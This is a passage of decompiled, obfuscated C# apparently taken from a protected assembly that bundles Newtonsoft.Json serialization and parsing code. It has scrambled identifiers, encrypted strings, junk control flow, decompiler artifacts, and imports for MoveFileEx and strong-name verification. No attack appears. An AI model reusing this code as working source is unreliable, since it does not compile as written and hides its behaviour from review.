      // ISSUE: reference to a compiler-generated field
      return obj1.Where<IXmlNode>((Func<IXmlNode, bool>) (obj0_2 => \u0007\u0002.\u008B\u0004(obj0_2.\u0003(), XmlNodeConverter.\u003C\u003Ec.\u0019(10193))));
    }

    static void \u0001()
    {
      try
      {
        \u0013.\u000E.\u0001();
      }
      catch (Exception ex)
      {
      }
    }

    static char[] \u0001([In] char[] obj0, [In] int obj1, [In] \u0004.\u0003<char> obj2)
    {
      if (false)
        goto label_2;
      else
        goto label_3;
label_1:
      if (true)
      {
        if (obj0 != null)
          obj2.\u0001(obj0);
      }
      else
        goto label_4;
label_2:
      if (true)
        return obj2.\u0001(obj1);
      goto label_1;
label_3:
      if (obj2 != null)
        goto label_1;
label_4:
      return new char[obj1];
    }

    static DateTimeOffset? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new DateTimeOffset?();
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(true, \u0015.\u0013.\u0008, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19618), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
      if (obj.\u0001 == null)
        return new DateTimeOffset?();
      if (obj.\u0001 is DateTimeOffset)
        return (DateTimeOffset?) obj.\u0001;
      return obj.\u0001 is string ? new DateTimeOffset?(DateTimeOffset.Parse((string) obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture)) : new DateTimeOffset?(new DateTimeOffset(Convert.ToDateTime(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture)));
    }

    static object \u0001(
      [In] \u0012.\u0007 obj0,
      [In] \u0011.\u0008 obj1,
      [In] JsonProperty obj2,
      [In] JsonSerializerInternalReader obj3)
    {
      object obj;
      while (!obj1.\u0001)
      {
        if (true)
        {
          obj = \u0014.\u0006.\u0001(obj3, obj0, (System.Type) null, (\u0016.\u0007) null, (JsonProperty) null, (\u0006.\u0002) obj1, obj2, (object) null);
          goto label_3;
        }
      }
      if (true)
        obj = (object) \u0014.\u0006.\u0001(obj0);
label_3:
      return obj;
    }

    static void \u0001([In] \u0008.\u0010 obj0)
    {
      obj0.\u0001 = (\u0015.\u0013) obj0.\u0002;
      if (false)
        return;
      obj0.\u0002 = ((\u0015.\u0013) obj0.\u0002).\u0001();
      while (obj0.\u0002 != null && ((\u0015.\u0013) obj0.\u0002).\u0001() == JTokenType.Property)
      {
        if (true)
        {
          obj0.\u0002 = ((\u0015.\u0013) obj0.\u0002).\u0001();
          break;
        }
      }
    }

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    static extern bool \u0001(string _param0, string _param1, int _param2);

    static void \u0001([In] \u0016.\u0003 obj0, [In] JsonWriter obj1, [In] object obj2) => obj0.\u0001(obj1, obj2, (System.Type) null);

    static Uri \u0001([In] \u0015.\u0013 obj0)
    {
      if (true)
        goto label_11;
label_6:
      \u0006.\u0005 obj;
      if (obj.\u0001 == null)
        return (Uri) null;
      return !(obj.\u0001 is Uri) ? new Uri(\u0095\u0002.\u0017\u0006(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004())) : (Uri) obj.\u0001;
label_11:
      if (obj0 == null)
        return (Uri) null;
      obj = \u0014.\u0006.\u0001(obj0);
      if (obj != null)
      {
        int num = 1;
        if (num != 0 && num != 0)
          num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0006, (\u0015.\u0013) obj) ? 1 : 0;
        if (num != 0)
          goto label_6;
      }
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19671), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
    }

    static unsafe void \u0001([In] IList<PropertyInfo> obj0, [In] System.Type obj1, [In] BindingFlags obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      while ((object) (obj1 = \u0015.\u000E.\u0001(obj1)) != null)
      {
        PropertyInfo[] properties = obj1.GetProperties(obj2);
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < properties.Length)
        {
          if (true)
            goto label_19;
label_15:
          *(int*) voidPtr = *(int*) voidPtr + 1;
          continue;
label_19:
          PropertyInfo propertyInfo = properties[*(int*) voidPtr];
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: variable of a compiler-generated type
          ReflectionUtils.\u0001 obj = new ReflectionUtils.\u0001();
          // ISSUE: reference to a compiler-generated field
          obj.\u0001 = propertyInfo;
          // ISSUE: reference to a compiler-generated field
          if (!\u0014.\u0006.\u0001(obj.\u0001))
          {
            // ISSUE: reference to a compiler-generated method
            *(int*) ((IntPtr) voidPtr + 4) = \u000E.\u0008.\u0001<PropertyInfo>((IEnumerable<PropertyInfo>) obj0, new Func<PropertyInfo, bool>(obj.\u0001));
            if (*(int*) ((IntPtr) voidPtr + 4) == -1)
            {
              // ISSUE: reference to a compiler-generated field
              obj0.Add(obj.\u0001);
              goto label_15;
            }
            else if (!\u0014.\u0006.\u0001(obj0[*(int*) ((IntPtr) voidPtr + 4)]))
            {
              // ISSUE: reference to a compiler-generated field
              obj0[*(int*) ((IntPtr) voidPtr + 4)] = obj.\u0001;
              goto label_15;
            }
            else
              goto label_15;
          }
          else
          {
            int num1;
            // ISSUE: reference to a compiler-generated field
            if (!ReflectionUtils.\u0001(obj.\u0001))
            {
              // ISSUE: reference to a compiler-generated method
              int num2 = \u000E.\u0008.\u0001<PropertyInfo>((IEnumerable<PropertyInfo>) obj0, new Func<PropertyInfo, bool>(obj.\u0002));
              if (true)
              {
                if (num2 == -1)
                {
                  // ISSUE: reference to a compiler-generated field
                  obj0.Add(obj.\u0001);
                  goto label_15;
                }
                else
                  goto label_15;
              }
              else
                num1 = num2;
            }
            else
            {
              // ISSUE: reference to a compiler-generated method
              num1 = \u000E.\u0008.\u0001<PropertyInfo>((IEnumerable<PropertyInfo>) obj0, new Func<PropertyInfo, bool>(obj.\u0003));
            }
            if (num1 == -1)
            {
              // ISSUE: reference to a compiler-generated field
              obj0.Add(obj.\u0001);
              goto label_15;
            }
            else
              goto label_15;
          }
        }
      }
    }

    static void \u0001([In] int? obj0, [In] \u0012.\u0007 obj1)
    {
      int? nullable = obj0;
      int num1 = 0;
label_1:
      if (num1 == 0)
        goto label_11;
label_5:
      do
      {
        if (false)
          goto label_1;
      }
      while (false);
      if (num1 != 0)
        throw new ArgumentException(\u0014.\u0006.\u0082(19708), \u0014.\u0006.\u0082(4207));
      obj1.\u0001 = obj0;
      return;
label_11:
      int num2 = num1;
      if (nullable.GetValueOrDefault() > num2)
      {
        if (false)
          return;
        num1 = 0;
        goto label_5;
      }
      else
      {
        num1 = nullable.HasValue ? 1 : 0;
        goto label_5;
      }
    }

    static unsafe void \u0001([In] \u0011.\u0003 obj0, [In] \u0012.\u0005 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(32);
      \u0014.\u0006.\u0001(obj0);
      char ch = obj0.\u0001[obj0.\u0002];
      *(int*) ((IntPtr) voidPtr + 24) = obj0.\u0002;
      \u0014.\u0006.\u0001(obj0);
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, true);
      obj0.\u0001 = new \u0015.\u0008(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 24), obj0.\u0002 - *(int*) ((IntPtr) voidPtr + 24));
      bool flag1 = \u009A.\u000E\u0004(ch) && obj0.\u0001.\u0002() == 1;
      int num1;
      if (ch == '0' && obj0.\u0001.\u0002() > 1 && obj0.\u0001.\u0001()[obj0.\u0001.\u0001() + 1] != '.' && obj0.\u0001.\u0001()[obj0.\u0001.\u0001() + 1] != 'e')
        num1 = obj0.\u0001.\u0001()[obj0.\u0001.\u0001() + 1] != 'E' ? 1 : 0;
      else if (true)
        num1 = 0;
      else
        goto label_36;
      bool flag2 = num1 != 0;
      object obj;
      JsonToken jsonToken;
      switch (obj1)
      {
        case \u0012.\u0005.\u0002:
          if (flag1)
            obj = (object) ((int) ch - 48);
          else if (flag2)
          {
            string str = obj0.\u0001.ToString();
            try
            {
              obj = (object) (\u0097.\u007E\u0001\u0004((object) str, \u0014.\u0006.\u0082(19741), StringComparison.OrdinalIgnoreCase) ? \u008E\u0004.\u0087\u0008(str, 16) : \u008E\u0004.\u0087\u0008(str, 8));
            }
            catch (Exception ex)
            {
              throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19746), (IFormatProvider) \u0098.\u0002\u0004(), (object) str), (\u0012.\u0007) obj0, ex);
            }
          }
          else
          {
            // ISSUE: cast to a reference type
            switch (\u0014.\u0006.\u0001(obj0.\u0001.\u0001(), obj0.\u0001.\u0001(), obj0.\u0001.\u0002(), (int&) ((IntPtr) voidPtr + 28)))
            {
              case \u0011.\u0007.\u0002:
                obj = (object) *(int*) ((IntPtr) voidPtr + 28);
                break;
              case \u0011.\u0007.\u0003:
                throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19803), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001.ToString()));
              default:
                throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19746), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001.ToString()));
            }
          }
          jsonToken = JsonToken.Integer;
          goto label_54;
        case \u0012.\u0005.\u0005:
          if (flag1)
            obj = (object) \u0090\u0004.\u0089\u0008(\u008F\u0004.\u0088\u0008(ch), 48M);
          else if (flag2)
          {
            string str = obj0.\u0001.ToString();
            try
            {
              obj = (object) Convert.ToDecimal(\u0097.\u007E\u0001\u0004((object) str, \u0014.\u0006.\u0082(19741), StringComparison.OrdinalIgnoreCase) ? \u0091\u0004.\u008A\u0008(str, 16) : \u0091\u0004.\u008A\u0008(str, 8));
            }
            catch (Exception ex)
            {
              throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19876), (IFormatProvider) \u0098.\u0002\u0004(), (object) str), (\u0012.\u0007) obj0, ex);
            }
          }
          else
          {
            Decimal num2;
            if (!\u0093\u0004.\u008C\u0008(obj0.\u0001.ToString(), NumberStyles.Number | NumberStyles.AllowExponent, (IFormatProvider) \u0098.\u0002\u0004(), ref num2))
              throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19876), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001.ToString()));
            obj = (object) num2;
          }
          jsonToken = JsonToken.Float;
          goto label_54;
        case \u0012.\u0005.\u0008:
          if (flag1)
            obj = (object) ((double) ch - 48.0);
          else if (flag2)
          {
            string str = obj0.\u0001.ToString();
            try
            {
              obj = (object) Convert.ToDouble(\u0097.\u007E\u0001\u0004((object) str, \u0014.\u0006.\u0082(19741), StringComparison.OrdinalIgnoreCase) ? \u0091\u0004.\u008A\u0008(str, 16) : \u0091\u0004.\u008A\u0008(str, 8));
            }
            catch (Exception ex)
            {
              throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19933), (IFormatProvider) \u0098.\u0002\u0004(), (object) str), (\u0012.\u0007) obj0, ex);
            }
          }
          else
          {
            if (!\u0095\u0004.\u008E\u0008(obj0.\u0001.ToString(), NumberStyles.Float, (IFormatProvider) \u0098.\u0002\u0004(), ref *(double*) voidPtr))
              throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19933), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001.ToString()));
            obj = (object) *(double*) voidPtr;
          }
          jsonToken = JsonToken.Float;
          goto label_54;
      }
label_36:
      if (flag1)
      {
        obj = (object) ((long) ch - 48L);
        jsonToken = JsonToken.Integer;
      }
      else if (flag2)
      {
        string str = obj0.\u0001.ToString();
        try
        {
          obj = (object) (\u0097.\u007E\u0001\u0004((object) str, \u0014.\u0006.\u0082(19741), StringComparison.OrdinalIgnoreCase) ? \u0091\u0004.\u008A\u0008(str, 16) : \u0091\u0004.\u008A\u0008(str, 8));
        }
        catch (Exception ex)
        {
          throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19990), (IFormatProvider) \u0098.\u0002\u0004(), (object) str), (\u0012.\u0007) obj0, ex);
        }
        jsonToken = JsonToken.Integer;
      }
      else
      {
        // ISSUE: cast to a reference type
        switch (\u0014.\u0006.\u0001(obj0.\u0001.\u0001(), obj0.\u0001.\u0001(), obj0.\u0001.\u0002(), (long&) ((IntPtr) voidPtr + 8)))
        {
          case \u0011.\u0007.\u0002:
            obj = (object) *(long*) ((IntPtr) voidPtr + 8);
            jsonToken = JsonToken.Integer;
            break;
          case \u0011.\u0007.\u0003:
            throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20047), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001.ToString()));
          default:
            string str1 = obj0.\u0001.ToString();
            if (((\u0012.\u0007) obj0).\u0001 == \u0015.\u0002.\u0002)
            {
              Decimal num3;
              if (!\u0093\u0004.\u008C\u0008(str1, NumberStyles.Number | NumberStyles.AllowExponent, (IFormatProvider) \u0098.\u0002\u0004(), ref num3))
                throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19876), (IFormatProvider) \u0098.\u0002\u0004(), (object) str1));
              obj = (object) num3;
            }
            else
            {
              // ISSUE: cast to a reference type
              if (!\u0095\u0004.\u008E\u0008(str1, NumberStyles.Float | NumberStyles.AllowThousands, (IFormatProvider) \u0098.\u0002\u0004(), (double&) ((IntPtr) voidPtr + 16)))
                throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19990), (IFormatProvider) \u0098.\u0002\u0004(), (object) str1));
              obj = (object) *(double*) ((IntPtr) voidPtr + 16);
            }
            jsonToken = JsonToken.Float;
            break;
        }
      }
label_54:
      \u0014.\u0006.\u0001(obj0);
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, jsonToken, obj, false);
    }

    static JsonContainerType \u0001([In] \u0012.\u0007 obj0)
    {
      \u0011.\u0002 obj;
      if (obj0.\u0001 == null || obj0.\u0001.Count <= 0)
      {
        obj = obj0.\u0001;
        obj0.\u0001 = new \u0011.\u0002();
      }
      else
        goto label_6;
label_2:
      if (obj0.\u0001.HasValue)
      {
        int num = obj0.\u0001();
        int? nullable = obj0.\u0001;
        int valueOrDefault = nullable.GetValueOrDefault();
        if ((num <= valueOrDefault ? (nullable.HasValue ? 1 : 0) : 0) != 0)
          obj0.\u0001 = false;
      }
      return obj.\u0001;
label_6:
      obj = obj0.\u0001;
      obj0.\u0001 = obj0.\u0001[obj0.\u0001.Count - 1];
      obj0.\u0001.RemoveAt(obj0.\u0001.Count - 1);
      goto label_2;
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
label_0:
      if (true)
        ++obj0.\u0002;
      do
      {
        \u0014.\u0006.\u0001(obj0, obj0.\u0002);
        if (false)
          goto label_0;
      }
      while (false);
    }

    static bool \u0001([In] object obj0)
    {
      if (true)
      {
        \u000F.\u0003 obj = \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0017\u0004(obj0));
        int num1;
        do
        {
          int num2 = (int) (obj - 6);
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
              case 4:
              case 6:
              case 8:
              case 10:
              case 12:
              case 14:
                if (true)
                {
                  num1 = 1;
                  if (num1 == 0)
                  {
                    num2 = num1;
                    continue;
                  }
                  goto label_5;
                }
                else
                  goto label_8;
              case 1:
              case 3:
              case 5:
              case 7:
              case 9:
              case 11:
              case 13:
                goto label_8;
              default:
                goto label_4;
            }
          }
label_4:;
        }
        while (false);
        goto label_8;
label_5:
        return num1 != 0;
      }
label_8:
      return false;
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonToken obj1)
    {
      JsonContainerType jsonContainerType = \u0014.\u0006.\u0001(obj0);
      if (\u0014.\u0006.\u0001(obj0, obj1) != jsonContainerType)
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20120), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1, (object) jsonContainerType));
      if (obj0.\u0001.\u0001 != JsonContainerType.None)
        obj0.\u0001 = \u0012.\u0007.\u0001.\u000E;
      else
        \u0014.\u0006.\u0001(obj0);
    }

    static bool \u0001(
      [In] MethodInfo obj0,
      [In] ParameterInfo[] obj1,
      [In] System.Type obj2,
      [In] MethodInfo obj3,
      [In] ref System.Type obj4)
    {
      if (!\u0096\u0004.\u007E\u008F\u0008((object) obj0, obj2, false))
        return false;
      while ((object) obj3 == null)
      {
        if ((object) obj4 != null)
          throw new JsonException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20282), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj4, (object) obj2, (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0)), (object) obj0));
        if (\u0015\u0002.\u007E\u009B\u0004((object) obj0))
          throw new JsonException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20379), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0, (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0)), (object) obj2));
        if (true)
        {
          // ISSUE: type reference
          if ((object) \u0001\u0002.\u007E\u001B\u0004((object) obj0) != (object) \u0004\u0002.\u0084\u0004(__typeref (void)))
            throw new JsonException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20480), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0)), (object) obj0));
          if (true)
          {
            // ISSUE: type reference
            if ((object) obj2 == (object) \u0004\u0002.\u0084\u0004(__typeref (\u0013.\u0005)))
            {
              // ISSUE: type reference
              if (obj1 == null || obj1.Length != 2 || (object) \u0001\u0002.\u007E\u0019\u0004((object) obj1[0]) != (object) \u0004\u0002.\u0084\u0004(__typeref (StreamingContext)))
                goto label_15;
              else
                goto label_14;
            }
            else
            {
              // ISSUE: type reference
              if (obj1 == null || obj1.Length != 1 || (object) \u0001\u0002.\u007E\u0019\u0004((object) obj1[0]) != (object) \u0004\u0002.\u0084\u0004(__typeref (StreamingContext)))
              {
                // ISSUE: type reference
                throw new JsonException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20695), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0)), (object) obj0, (object) \u0004\u0002.\u0084\u0004(__typeref (StreamingContext))));
              }
              goto label_18;
            }
          }
        }
        else
          break;
      }
      if (true)
        throw new JsonException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20193), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0, (object) obj3, (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0)), (object) obj2));
label_14:
      // ISSUE: type reference
      if ((object) \u0001\u0002.\u007E\u0019\u0004((object) obj1[1]) == (object) \u0004\u0002.\u0084\u0004(__typeref (\u0005.\u000E)))
        goto label_18;
label_15:
      // ISSUE: type reference
      // ISSUE: type reference
      throw new JsonException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20561), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0)), (object) obj0, (object) \u0004\u0002.\u0084\u0004(__typeref (StreamingContext)), (object) \u0004\u0002.\u0084\u0004(__typeref (\u0005.\u000E))));
label_18:
      obj4 = obj2;
      return true;
    }

    static void \u0001([In] \u0001.\u0007 obj0, [In] \u0004.\u000F<object> obj1)
    {
      obj0.\u0003 = obj1;
      obj0.\u0004(true);
    }

    static void \u0001([In] \u0004.\u0011 obj0)
    {
      do
      {
        while (obj0.\u0001)
        {
          if (true)
            throw new InvalidOperationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20812), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u0017\u0004((object) obj0)));
        }
      }
      while (false);
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] bool obj1, [In] bool obj2, [In] JsonWriter obj3, [In] bool obj4)
    {
      int num1;
      if (obj0.\u0001() == JsonToken.None)
        num1 = -1;
      else
        goto label_11;
label_2:
      int num2;
      int num3;
      if (num1 == 0)
      {
        num3 = num1;
        goto label_4;
      }
      else
        num2 = num1;
label_3:
      if (false)
        goto label_7;
      else
        goto label_8;
label_4:
      if (num3 == 0)
      {
        num1 = obj0.\u0001() + 1;
        if (true)
        {
          num2 = num1;
          goto label_8;
        }
        else
          goto label_2;
      }
label_7:
      num2 = obj0.\u0001();
label_8:
      do
        ;
      while (false);
      \u0014.\u0006.\u0001(obj3, obj0, num2, obj2, obj4, obj1);
      if (true)
        return;
      goto label_3;
label_11:
      num3 = \u0014.\u0006.\u0001(obj0.\u0001()) ? 1 : 0;
      goto label_4;
    }

    static unsafe void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] object obj2,
      [In] \u0011.\u0008 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      \u0014.\u0006.\u0001(obj0, obj1, (\u0016.\u0007) obj3, obj2);
      obj0.\u0001.Add(obj2);
      \u0014.\u0006.\u0001(obj4, obj0, (\u0016.\u0007) obj3, obj6, obj1, obj2, obj5);
      *(int*) voidPtr = \u0014.\u0006.\u0001(obj1);
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      while (*(int*) ((IntPtr) voidPtr + 4) < obj3.\u0001().Count)
      {
        JsonProperty jsonProperty = obj3.\u0001()[*(int*) ((IntPtr) voidPtr + 4)];
        try
        {
          \u0016.\u0007 obj7;
          object obj8;
          if (\u0014.\u0006.\u0001(ref obj7, obj2, jsonProperty, ref obj8, obj4, obj1, obj0, (\u0006.\u0002) obj3))
          {
            \u0014.\u0006.\u0001(jsonProperty, obj1);
            \u0014.\u0006.\u0001(obj0, obj1, obj8, obj7, jsonProperty, (\u0006.\u0002) obj3, obj4);
          }
        }
        catch (Exception ex)
        {
          object obj = (object) jsonProperty.\u0001;
          if (\u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj1), obj2, obj, ex, (\u000F.\u0001) null, (\u0016.\u0007) obj3, (\u0016.\u0008) obj0))
            \u0014.\u0006.\u0001(obj1, obj0, *(int*) voidPtr);
          else
            throw;
        }
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
      }
      if (obj3.\u0001() != null)
      {
        IEnumerable<KeyValuePair<object, object>> keyValuePairs = obj3.\u0001()(obj2);
        if (keyValuePairs != null)
        {
          IEnumerator<KeyValuePair<object, object>> enumerator = keyValuePairs.GetEnumerator();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
            {
              KeyValuePair<object, object> current = enumerator.Current;
              \u0016.\u0007 obj9 = \u0014.\u0006.\u0001(current.Key, obj0);
              \u0016.\u0007 obj10 = \u0014.\u0006.\u0001(current.Value, obj0);
              // ISSUE: cast to a reference type
              string str = \u0014.\u0006.\u0001(current.Key, (bool&) ((IntPtr) voidPtr + 8), obj1, obj0, obj9);
              if (\u0014.\u0006.\u0001(current.Value, obj10, (JsonProperty) null, obj4, (\u0006.\u0002) obj3, obj0))
              {
                obj1.\u0002(str);
                \u0014.\u0006.\u0001(current.Value, obj1, obj0);
              }
              else if (\u0014.\u0006.\u0001(obj0, obj1, current.Value, (JsonProperty) null, obj10, (\u0006.\u0002) obj3, obj4))
              {
                obj1.\u0002(str);
                \u0014.\u0006.\u0001(obj0, obj1, current.Value, obj10, (JsonProperty) null, (\u0006.\u0002) obj3, obj4);
              }
            }
          }
          finally
          {
            if (enumerator != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator);
          }
        }
      }
      obj1.\u0011();
      obj0.\u0001.RemoveAt(obj0.\u0001.Count - 1);
      \u0014.\u0006.\u0001(obj1, obj0, obj2, (\u0016.\u0007) obj3);
    }

    static string \u0001([In] string obj0) => \u0014.\u0006.\u0001('"', obj0);

    static \u0013.\u000F.\u0004 \u0001([In] \u0013.\u000F.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0003];
      Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
      return new \u0013.\u000F.\u0004(destinationArray);
    }

    static \u0012.\u0015 \u0001([In] object obj0) => (\u0012.\u0015) obj0;

    static void \u0001() => \u0014.\u0006.\u0001();

    static Func<object> \u0001([In] System.Type obj0, [In] DefaultContractResolver obj1) => \u0014.\u0006.\u0001().\u0001<object>(obj0);

    static object \u0001([In] JsonProperty obj0) => !obj0.\u0001 ? (object) null : obj0.\u0001;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static string \u0001([In] string obj0)
    {
      string str1;
      string str2;
      \u0014.\u0006.\u0001(ref str1, out str2, obj0);
      return str2;
    }

    static void \u0001([In] \u0013.\u000F.\u0003 obj0, [In] int obj1)
    {
label_0:
      do
      {
        \u0013.\u000F.\u0003 obj2 = obj0;
        int num1;
        int num2 = num1 = obj2.\u0002;
        obj2.\u0002 = num1 + 1;
        do
        {
          if (true)
          {
            if (num2 != 32768)
              goto label_3;
label_2:
            goto label_0;
label_3:
            if (true)
            {
              byte[] numArray = obj0.\u0001;
              \u0013.\u000F.\u0003 obj3 = obj0;
              int num3;
              int num4 = num3 = obj3.\u0001;
              obj3.\u0001 = num3 + 1;
              int index = num4;
              int num5 = (int) (byte) obj1;
              numArray[index] = (byte) num5;
              if (false)
                goto label_2;
            }
            else
              goto label_0;
          }
          else
            goto label_0;
        }
        while (false);
        goto label_5;
      }
      while (false);
      goto label_7;
label_5:
      obj0.\u0001 &= (int) short.MaxValue;
      return;
label_7:
      throw new InvalidOperationException();
    }

    static void \u0001()
    {
      try
      {
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
          return;
        MemoryManager.\u0001 = new MemoryManager();
      }
      catch
      {
      }
    }

    static string \u0001([In] bool obj0, [In] \u0011.\u0001 obj1, [In] double obj2, [In] string obj3, [In] char obj4)
    {
      if (true)
        goto label_12;
label_4:
      if (\u0097\u0004.\u0091\u0008(obj2))
        goto label_14;
      else
        goto label_13;
label_6:
      int num1;
      if (num1 != 0)
      {
        if (true)
          return \u0015.\u0006.\u0003;
        goto label_4;
      }
label_9:
      if (true)
        return \u0014.\u0006.\u0082(20881);
      goto label_13;
label_12:
      if (obj1 != \u0011.\u0001.\u0002)
      {
        int num2 = \u0097\u0004.\u0090\u0008(obj2) ? 1 : 0;
        if (true)
        {
          if (num2 != 0)
            goto label_14;
          else
            goto label_4;
        }
        else
        {
          num1 = num2;
          goto label_6;
        }
      }
label_13:
      return obj3;
label_14:
      if (obj1 != \u0011.\u0001.\u0003)
        return global::\u0005.\u0099(obj4.ToString(), obj3, obj4.ToString());
      if (true)
      {
        num1 = obj0 ? 1 : 0;
        goto label_6;
      }
      else
        goto label_9;
    }

    static \u0016.\u0004 \u0001([In] JsonWriter obj0)
    {
      if (true)
        goto label_12;
label_2:
      return \u0016.\u0004.\u0002;
label_12:
      switch (obj0.\u0001)
      {
        case JsonWriter.State.Start:
          return \u0016.\u0004.\u0007;
        case JsonWriter.State.Property:
          return \u0016.\u0004.\u0006;
        case JsonWriter.State.ObjectStart:
        case JsonWriter.State.Object:
          return \u0016.\u0004.\u0003;
        case JsonWriter.State.ArrayStart:
        case JsonWriter.State.Array:
          if (true)
            return \u0016.\u0004.\u0004;
          goto default;
        case JsonWriter.State.ConstructorStart:
        case JsonWriter.State.Constructor:
          if (true)
          {
            if (true)
              return \u0016.\u0004.\u0005;
            goto case JsonWriter.State.ArrayStart;
          }
          else
            goto default;
        case JsonWriter.State.Closed:
          goto label_2;
        case JsonWriter.State.Error:
          return \u0016.\u0004.\u0001;
        default:
          if (true)
            throw \u0014.\u0006.\u0001(obj0, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(20886), (object) obj0.\u0001), (Exception) null);
          goto case JsonWriter.State.ObjectStart;
      }
    }

    static bool \u0001([In] PropertyInfo obj0)
    {
      if ((object) \u008C\u0002.\u007E\u0003\u0006((object) obj0) == null)
        goto label_6;
label_1:
      int num1 = \u0015\u0002.\u007E\u001A\u0005((object) \u008C\u0002.\u007E\u0003\u0006((object) obj0)) ? 1 : 0;
label_2:
      if (true)
      {
        if (num1 == 0)
          goto label_6;
      }
      else
        goto label_10;
label_4:
      int num2 = 1;
      if (num2 != 0)
        return num2 != 0;
